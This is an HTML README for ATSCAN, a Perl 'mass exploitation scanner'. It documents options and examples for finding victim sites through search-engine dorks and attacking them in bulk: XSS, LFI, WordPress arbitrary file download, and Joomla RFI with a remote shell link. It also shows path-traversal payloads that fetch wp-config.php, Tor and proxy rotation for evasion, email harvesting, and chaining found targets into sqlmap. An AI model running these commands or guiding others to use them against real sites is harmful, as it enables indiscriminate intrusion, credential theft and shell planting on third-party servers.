<html>
<body>
<h1 align="center">ATSCAN</h1>
<p align="center"> <b>Advanced Search / Dork / Mass Exploitation Scanner </b></p>
<table border="0" cellpadding="2" cellspacing="2" width="100%">
  <tr>
    <td align="center"><b>Alisam Technology is not responsible for any misuse, damage caused by this script or attacking targets without prior mutual consent!<b></td>
  </tr>
</table>
<table border="0" cellpadding="0" cellspacing="2" width="100%">
  <tr>
    <td width="100px" class="main2"><b>Tool:</b></td>
    <td width="780px"><b>ATSCAN version 10<b/></td>
  </tr>
  <tr>
    <td width="100px" class="main2"><b>Codename:</b></td><td width="780px">Anon4t</td>
  </tr>
  <tr>
    <td width="100px" class="main2"><b>AUTHOR:</b></td><td width="780px">Ali MEHDIOUI</td>
  </tr>
  <tr>
    <td width="100px" class="main2"><b>GROUP:</b></td><td width="780px">Alisam Technology</td>
  </tr>
  <tr>
    <td width="100px" class="main2"><b>FACE:</b></td><td>facebook.com/Forces.des.tempetes.marocaines </td>
  </tr>
  <tr>
    <td width="100px" class="main2"><b>YOUTUBE:</b></td><td>youtube.com/c/AlisamTechnology</td>
  </tr>
  <tr>
    <td width="100px" class="main2"><b>WITTER:</b></td><td>twitter.com/AlisamTechno</td>
  </tr>
  <tr>
    <td width="100px" class="main2"><b>PLUS:</b></td><td>plus.google.com/+AlisamTechnology</td>
  </tr>
</table>
<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td class="main3"><b>Description:</b></td>
  </tr>
  <tr>
    <td class="main" width="890px">Search engine Google / Bing / Ask / Yandex / Sogou <br />
        Mass Dork Search<br/>Multiple instant scans. <br/>Mass Exploitation <br/>Extern commands execution.<br/>
        XSS scanner.<br />LFI / AFD scanner.<br /> Filter wordpress and Joomla sites in the server. <br />
        Find Admin page.<br />Decode / Encode MD5 + Base64.<br/> Ports scan. <br/>Scan ips<br/>Scan E-mails. <br/> Use proxy. <br/> Random user agent. <br/> Random proxy. <br/> Scan errors. <br/> Detect Cms.<br/>And more...
    </td>
  </tr>
</table>
<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td class="main3" width="890px"> <b>Libreries to install:</b></td>
  </tr>
  <tr>
    <td class="main">
      Perl Requiered. <br/>
      Works in all platforms.
    </td>
  </tr>
</table>
<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td class="main3" width="890px"><b>Download:</b></td>
  </tr>
  <tr>
    <td class="main">
      git clone https://github.com/AlisamTechnology/ATSCAN <br/>
      OR direct link: https://github.com/AlisamTechnology/ATSCAN
    </td>
  </tr>
</table>
<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td class="main3" width="890px"><b>Permissions:</b></td>
  </tr>
  <tr>
    <td class="main">
      cd ATSCAN <br/>
      chmod +x ATSCAN
    </td>
  </tr>
</table>
<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td class="main3" width="890px"><b>Installation:</b></td>
  </tr>
  <tr>
    <td class="main">chmod +x ./install.sh <br/>./install.sh </td>
  </tr>
</table>

<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td class="main3" width="890px"><b>Execution:</b></td>
  </tr>
  <tr>
    <td class="main">
      Direct Tool Execution: perl ./atscan.pl<br/>
      Installed Tool Execution: atscan
    </td>
  </tr>
</table>
<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td class="main3" width="890px"><b>Uninstall Tool:</b></td>
  </tr>
  <tr>
    <td class="main">
      atscan --uninstall<br/>
    </td>
  </tr>
</table>
<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td class="main3"><b>Screenshots:</b></td>
  </tr>
  <tr>
    <td align="center" width="890px">
    <img src="http://i.imgur.com/c9V8cGR.jpg" /><br/><br/>
    <img src="http://i.imgur.com/EvHAssB.jpg" /><br/><br/>
    </td>
  </tr>
</table>
<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td class="main3" width="890px"><b>Help:</b></td>
  </tr>
  <tr>
    <td class="main"><table border="0" cellpadding="2" cellspacing="5" width="100%">
      <tr>
        <td width="200px" class="main">--proxy</td>
        <td width="680px">Set tor proxy [Ex: socks://localhost:9050].<br/> Set proxy  [Ex: http://12.231.54.87:8080 | list.txt].</td>
      </tr>
      <tr>
        <td width="200px" class="main">--random</td>
        <td width="680px">Renew identity foreach link scanned.</td>
      </tr>
      <tr>
        <td width="200px" class="main">rang(x-y)</td>
        <td width="680px">EX: --exp /index.php?id=rang(1-9) --xss OR -t site.com/index.php?id=rang(1-9) --xss</td>
      </tr>
      <tr>
        <td width="200px" class="main">repeat(string-y)</td>
        <td width="680px">EX: --exp /index.php?id=repeat(../-9)wp-config.php
        <br>OR -t site.com/index.php?id=../wp-config.php
        <br>site.com/index.php?id=../wp-config.php  then site.com/index.php?id=../../wp-config.php 9 times.</td
      </tr>
      <tr>
         <td width="200px" class="main">--dork/-d</td>
        <td class="main">dork to search [Ex: house,cars,hotel]</td>
      </tr>
      <tr>
        <td width="200px" class="main">--level/-l</td>
        <td class="main">Scan level (+- Number of page results to scan)</td>
      </tr>
      <tr>
        <td width="200px" class="main">-m</td>
        <td class="main">Set engine motor [Bing = 1][Google = 2][Ask = 3][Yandex = 4][Sogou = 5][All = all]</td>
      </tr>
      <tr>
        <td width="200px" class="main">-t</td>
        <td class="main">Target [http://site.com]</td>
      </tr>
      <tr>
        <td width="200px" class="main">-p</td>
        <td class="main">Set test parameter EX:id,cat,product_ID</td>
      </tr>
      <tr>
        <td width="200px" class="main">--time</td>
        <td class="main">Set browser time out.</td>
      </tr>
      <tr>
        <td width="200px" class="main">--xss</td>
        <td class="main">Xss scan</td>
      </tr>
      <tr>
        <td width="200px" class="main">--joomrfi</td>
        <td class="main">joomla local file inclusion scan</td>
      </tr>
      <tr>
        <td width="200px" class="main">--TARGET</td>
        <td class="main">Will be replaced by target in extern commands</td>
      </tr>
      <tr>
        <td width="200px" class="main">--HOST</td>
        <td class="main">Will be replaced by hostname in extern commands</td>
      </tr>
      <tr>
        <td width="200px" class="main">--host</td>
        <td class="main">Domaine name Ex: site.com</td>
      </tr>
      <tr>
        <td width="200px" class="main">--exp</td>
        <td class="main">Set exploit/payload</td>
      </tr>
      <tr>
        <td width="200px" class="main">--valid/-v</td>
        <td class="main">Text to validate results</td>
      </tr>
      <tr>
        <td width="200px" class="main">--unique</td>
        <td class="main">Get urls with exact dork matching</td>
      </tr>
      <tr>
        <td width="200px" class="main">--regex</td>
        <td class="main">Crawl to get strings matching regex</td>
      </tr>
      <tr>
        <td width="200px" class="main">--sregex</td>
        <td class="main">Get only urls with matching regex</td>
      </tr>
      <tr>
        <td width="200px" class="main">--noquery</td>
        <td class="main">Remove Query string from url. [url like: site.com/index.php?id=]</td>
      </tr>
      <tr>
        <td width="200px" class="main">--ip</td>
        <td class="main">Scan targets for ips.</td>
      </tr>
      <tr>
        <td width="200px" class="main">--pause</td>
        <td class="main">Pause scan when first result found.</td>
      </tr>
      <tr>
        <td width="200px" class="main">--ifinurl</td>
        <td class="main">Text to validate target url</td>
      </tr>
      <tr>
        <td width="200px" class="main">--lfi</td>
        <td class="main">local file inclusion</td>
      </tr>
      <tr>
        <td width="200px" class="main">--joomrfi</td>
        <td class="main">get joomla sites with rfi</td>
      </tr>
      <tr>
        <td width="200px" class="main">--shell</td>
        <td class="main">shell link [Ex: http://www.site.com/shell.txt]</td>
      </tr>
      <tr>
        <td width="200px" class="main">--wpafd</td>
        <td class="main">get wordpress sites with arbitery file download</td>
      </tr>
      <tr>
        <td width="200px" class="main">--admin</td>
        <td class="main">get site admin page</td>
      </tr>
      <tr>
        <td width="200px" class="main">--shost</td>
        <td class="main">get site subdomains</td>
      </tr>
      <tr>
        <td width="200px" class="main">--port</td>
        <td class="main">port</td>
      </tr>      
      <tr>
        <td width="200px" class="main">--udp</td>
        <td class="main">UDP port</td>
      </tr>
      <tr>
        <td width="200px" class="main">--tcp</td>
        <td class="main">TCP port</td>
      </tr>      
      <tr>
        <td width="200px" class="main">--sites</td>
        <td class="main">sites in the server</td>
      </tr>
      <tr>
        <td width="200px" class="main">--wp</td>
        <td class="main">get wordpress sites</td>
      </tr>
      <tr>
        <td width="200px" class="main">--joom</td>
        <td class="main">Getjoomla sites</td>
      </tr>
      <tr>
        <td width="200px" class="main">--upload</td>
        <td class="main">get sites with upload files</td>
      </tr>
      <tr>
        <td width="200px" class="main">--zip</td>
        <td class="main">get sites with zip files</td>
      </tr>
      <tr>
        <td width="200px" class="main">--save/-s</td>
        <td class="main">Save scan results.</td>
      </tr>
      <tr>
        <td width="200px" class="main">--md5</td>
        <td class="main">convert to md5</td>
      </tr>
      <tr>
        <td width="200px" class="main">--encode64</td>
        <td class="main">encode base64 string</td>
      </tr>
      <tr>
        <td width="200px" class="main">--decode64</td>
        <td class="main">decode base64 string</td>
      </tr>
      <tr>
        <td width="200px" class="main">--isup</td>
        <td class="main">check http status 200</td>
      </tr>
      <tr>
        <td width="200px" class="main">--email</td>
        <td class="main">Extract e-mails</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--command</td>
        <td class="main">External Command</td>
      </tr>
      <tr>
        <td width="200px" class="main">--replace</td>
        <td class="main">string to replace</td>
      </tr>
      <tr>
        <td width="200px" class="main">--with</td>
        <td class="main">string to replace with</td>
      </tr>
        <td width="200px" class="main">--nobanner</td>
        <td class="main">Hide tool banner</td>
      </tr>
      <tr>
        <td width="200px" class="main">--noinfo</td>
        <td class="main">Jump extra results info.</td>
      </tr>
      <tr>
        <td width="200px" class="main">--options</td>
        <td class="main">Show scan configuration.</td>
      </tr>      
      <tr>
        <td width="200px" class="main">--save</td>
        <td class="main">Set file to save results.</td>
      </tr>
      <tr>
        <td width="200px" class="main">--beep</td>
        <td class="main">Produce beep sound if positive scan found</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--ifend</td>
        <td class="main">Produce beep sound when scan process is finished.</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--help | -h | -?</td>
        <td class="main">Help.</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--update</td>
        <td class="main">Update.</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--uninstall</td>
        <td class="main">Uninstall Tool.</td>
      </tr> 
    </table></td>
  </tr>
</table>
<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td width="890px"><b>Examples:</b></td>
  </tr>
  <tr>
    <td class="main" width="100%">
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>  
      <b>Proxy: </b><br/>
        Tor: --proxy [proxy] [Ex: --proxy socks://localhost:9050].<br/>
        Proxy: Proxy: --proxy [proxy] [Ex: http://12.32.1.5:8080] or --proxy [list.txt] [Ex: --proxy /root/Desktop/Documents/my_proxies.txt] <br/>
        Random --proxy [proxy] --random
      </td></tr></table>
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
      <b>Simple search: </b><br/>
        Search: atscan --dork [dork] --level [level]  OR atscan -d [dork] -l [level]<br/>
        atscan -d [dork] -l [level] --exp "/index.php?id=rang(1-9)" --xss<br/>
        Set engines + search: atscan --dork [dork] --level [level] -m 1,2,.. [Engines: Bing: 1 Google: 2 Ask: 3 Yandex: 4 Sogou: 5 All engines: all]<br/>
        Set selective engines: atscan --dork [dork] --level [level] -m 1,2,3..   <br/>
        Search with many dorks: atscan --dork [dork1,dork2,dork3] --level [level]    <br/>
        Get Server sites: atscan -t [ip] --level [value] --sites <br/>
        Get Server wordpress sites: atscan -t [ip] --level [value] --wp  <br/>
        Get Server joomla sites: atscan -t [ip] --level [value] --joom  <br/>
        Get Server upload sites: atscan -t [ip] --level [value] --upload  <br/>
        Get Server zip sites files: atscan -t [ip] --level [value] --zip  <br/>
        WP Arbitry File Download: atscan -t [ip] --level [value] --wpafd  <br/>
        Joomla RFI: atscan  -t [ip] --level [10] --joomfri --shell [shell link] <br/>
        Search + set save file: atscan --dork [dorks.txt] --level [level] --save <br/>
        Replace + Exploit: atscan --dork [dorks.txt] --level [level] --replace [string] --with [string] --valid [string] <br/>  
        Search + get emails: atscan --dork [dorks.txt] --level [level] --email  <br/>
        Search + get site emails: atscan --dork [site:site.com] --level [level] --email  <br/>  
        Search + get ips: atscan --dork [dork] --level [level] --ip  <br/>
        Search by url regex: atscan --dork [dork] --level [level] --sregex [regex]
      </td></tr></table>
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
      <b>Regular Expressions Scan: </b><br/>
        Regex use: atscan [--dork dork | -t target] --level [level] --regex [regex] <br/>
        EX: To get ips from an url content ((\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})) <br/>
        EX: To get mails ((([A-Za-z0-9]+_+)|([A-Za-z0-9]+\-+)|([A-Za-z0-9]+\.+)|([A-Za-z0-9]+\++))*[A-Za-z0-9]+@((\w+\-+)|(\w+\.))*\w{1,63}\.[a-zA-Z]{2,6}).
      </td></tr></table>
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
      <b>Exploitation from Serach Engine:</b><br/>
        Exploitation: atscan --dork [dork] --level [10] [--xss | --lfi | --wp |...] <br/>
        Server Exploitation: atscan -t [ip] --level [10] [--xss | --lfi | --wp |...] <br/>
        Replace + Exploit: atscan --dork [dork] --level [10] --replace [string] --with [string] --exp [exploit] [--valid [string] --xss..] <br/>
        atscan --dork [dork] --level [10] --exp "index.php?id=rang(1-10)" --valid [string] <br>
        atscan --dork [dork] --level [10] --exp "index.php?id=repeat(..%2F-10)wp-config.php" --valid [string]
      </td></tr></table>
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
      <b>Validation:</b><br/>
        Search + Url Validation: atscan --dork [dork] --level [10] --ifinurl [string] <br/>
        Search + dork Validation: atscan --dork [dork] --level [10] --unique <br/>
        Search + Exploit + Validation: atscan --dork [dork] --level [10] --exp [--isup | --valid] [string] <br/>
        Search + Server Exploit + Validation: atscan -t [ip] --level [10] --exp [--isup | --valid] [string] <br/>
        Replace + exploit or validate urls: atscan --dork [dork] --level [10] --replace [string] --with [string] [--isup | --valid [string]
      </td></tr></table>
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
      <b>Use List / Target:</b><br/>
        atscan -t [target | targets.txt] --exp [--isup | --valid] [string]<br/>
        atscan -t [target | targets.txt] [--xss | --lfi | --wp |...]
        atscan -t "http://site.com/index.php?id=rang(1-9)" --xss<br/>
      </td></tr></table>
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
      <b>Server Ports:</b><br/>
        Scan a server ports for open and close udp or tcp ports: atscan -t [Ex: 12.21.22.133] --ports [--udp | --tcp] --port [8080] <br/>
        atscan -t (ip start)-(ip end) --port [port] [--udp | --tcp]<br/>
        atscan -t [ip] --port [port start]-[port end] [--udp | --tcp] --command [your extern command for each open port found]
      </td></tr></table>
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
      <b>Encode / Decode:</b><br/>
        Generate MD5: atscan --md5 [string]<br/>
        Encode base64: atscan --encode64 [string]  <br/> 
        Decode base64: atscan --decode64 [string] 
      </td></tr></table>
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
      <b>External Command:</b><br/>
        atscan --dork [dork | dorks.txt] --level [level] --exp [payload] --valid [string] --command "sqlmap -u --TARGET --dbs"  <br/>
        atscan -t [target | targets.txt] --command "curl -v --TARGET"<br/>
        atscan -t [target | targets.txt] --command "curl -v --HOST"
      </td></tr></table>
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
      <b>Multiple Scans:</b><br/>
        atscan --dork [dork] --level [level] --xss --lfi --wp .. <br/>
        atscan -d [dork] -l [level] --replace [string] --with [string] --exp [exploit] [--xss | --lfi | --wp | --admin | --shost | ...] <br/>
        atscan -t [ip] --level [10] [--xss | --lfi | --wp |...] <br/>
        atscan -t [targets] [--xss | --lfi | --wp |...]
      </td></tr></table>
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
        <b>Check Tool and Update:</b><br/>
        atscan --update
      </td></tr></table>
    </td>
  </tr>
</table>  
</body>
</html>
